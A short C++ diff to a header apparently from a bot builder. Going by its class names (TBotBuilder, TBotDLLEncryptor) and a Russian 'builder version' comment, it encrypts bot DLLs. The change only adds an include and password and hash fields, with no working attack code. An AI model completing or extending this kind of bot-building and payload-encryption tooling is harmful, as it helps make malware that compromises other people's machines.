@@ -8,6 +8,7 @@
 //---------------------------------------------------------------------------
 #include <windows.h>
 #include <Classes.hpp>
+#include "Strings.h"
 
 
 // Версия сборщика
@@ -397,7 +398,9 @@ public:
 class TBotDLLEncryptor : public TCustomBotDataEncryptor
 {
 private:
-	DWORD FDllSize;
+	DWORD  FDllSize;
+	string FPassword;
+	DWORD  FHash;
 	friend class TBotBuilder;
 protected:
 	bool Write(LPBYTE Buf, DWORD BufSize);
